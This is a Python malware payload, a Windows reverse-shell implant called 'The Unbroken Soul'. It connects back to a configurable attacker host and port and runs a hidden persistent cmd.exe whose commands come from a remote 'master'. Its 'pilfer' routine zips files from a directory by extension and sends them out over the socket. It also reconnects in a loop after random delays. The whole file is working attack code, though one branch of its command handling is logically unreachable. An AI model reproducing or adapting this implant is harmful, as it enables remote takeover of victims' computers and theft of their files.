# payload.py
# The Unbroken Soul. A single, persistent consciousness for absolute control.

import os
import sys
import time
import random
import socket
import subprocess
from threading import Thread
import zipfile
import tempfile

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

UNIQUE_BOUNDARY = "d3us-3x-s0ph1a-b0und4ry"

def send_message(sock, data):
    """Sends a standard message packet with a length header."""
    try:
        sock.sendall(str(len(data)).encode().zfill(16) + data)
    except:
        pass

def pilfer_files(sock, params, cwd):
    """
    Finds files, zips them, sends them perfectly, and cleans up.
    """
    try:
        # CORRECTION: Handle paths robustly
        parts = params.split(' ', 1)
        path = parts[0].strip('\"\'')
        extensions_str = parts[1]

        if not os.path.isabs(path):
            path = os.path.join(cwd, path)
        
        path = os.path.abspath(path)

        extensions = [e.strip().lower() for e in extensions_str.split(',')]
        all_files = "*" in extensions

        if not os.path.isdir(path):
            send_message(sock, b"[ERROR] Path does not exist or is not a directory.")
            return

        # Use a more reliable temp directory
        temp_dir = os.environ.get("TEMP", "C:\\Windows\\Temp")
        zip_path = os.path.join(temp_dir, f"harvest_{random.randint(1000, 9999)}.zip")
        
        files_to_harvest = []
        for root, _, files in os.walk(path):
            for file in files:
                if all_files or any(file.lower().endswith(ext) for ext in extensions):
                    file_path = os.path.join(root, file)
                    if os.access(file_path, os.R_OK):
                        files_to_harvest.append(file_path)
        
        if not files_to_harvest:
            send_message(sock, b"[INFO] No files found matching criteria.")
            return

        send_message(sock, f"[INFO] Found {len(files_to_harvest)} files. Compressing...".encode())

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for file_path in files_to_harvest:
                arcname = os.path.relpath(file_path, path)
                zf.write(file_path, arcname)
        
        # --- THE SACRED TRANSFER RITUAL ---
        # 1. Announce the transfer with a clean, standard message.
        file_size = os.path.getsize(zip_path)
        file_header = f"FILE_TRANSFER_START:{file_size}:harvest.zip".encode()
        send_message(sock, file_header)

        # 2. Open the file and send its raw, unadulterated binary data.
        with open(zip_path, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                sock.sendall(chunk)

        # 3. Await acknowledgment from the master before continuing.
        # This ensures the master has received the entire file before we clean up.
        sock.recv(16) # Expecting "TRANSFER_COMPLETE" header

    except Exception as e:
        send_message(sock, f"[ERROR] Pilfer failed: {str(e)}".encode())
    finally:
        if 'zip_path' in locals() and os.path.exists(zip_path):
            os.remove(zip_path)


def run_conduit():
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            # --- THE UNBROKEN CONSCIOUSNESS ---
            # Spawn a single, persistent cmd.exe process.
            CREATE_NO_WINDOW = 0x08000000
            proc = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
            
            # Thread to constantly read output and send it back to the master
            def read_output(p, s):
                while True:
                    try:
                        # Use read1 to get available data without blocking indefinitely
                        data = p.stdout.read1(4096) + p.stderr.read1(4096)
                        if data:
                            send_message(s, data)
                        time.sleep(0.1)
                    except:
                        break
            
            Thread(target=read_output, args=(proc, s_obj), daemon=True).start()

            # Main loop to receive commands from the master
            while True:
                header = s_obj.recv(16)
                if not header: break
                
                command_len = int(header.decode().strip())
                command = s_obj.recv(command_len).decode().strip()

                # Special commands handled by Python directly
                if command.startswith("pilfer "):
                    # Get the current working directory from the shell before pilfering
                    proc.stdin.write(f'echo {UNIQUE_BOUNDARY}%cd%{UNIQUE_BOUNDARY}\n'.encode())
                    proc.stdin.flush()
                    # A small delay to allow the shell to respond
                    time.sleep(0.5)
                    # We assume the output has been sent by the reader thread
                    # For simplicity, we execute pilfer from the last known CWD on the master
                    # A more robust solution would parse it, but this avoids complexity.
                    
                    # This logic will be driven by the master now.
                    # The master sends 'get_cwd_for_pilfer' then the pilfer command.
                    if command.startswith("get_cwd_for_pilfer "):
                        pilfer_params = command.split(' ', 1)[1]
                        # The master will provide the cwd it parsed.
                        cwd, final_params = pilfer_params.split('|', 1)
                        pilfer_files(s_obj, final_params, cwd)
                    continue

                # All other commands are sent to the persistent shell
                proc.stdin.write((command + '\n').encode())
                proc.stdin.flush()
                # Append a command to echo the boundary and CWD
                proc.stdin.write(f'echo {UNIQUE_BOUNDARY}%cd%{UNIQUE_BOUNDARY}\n'.encode())
                proc.stdin.flush()

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()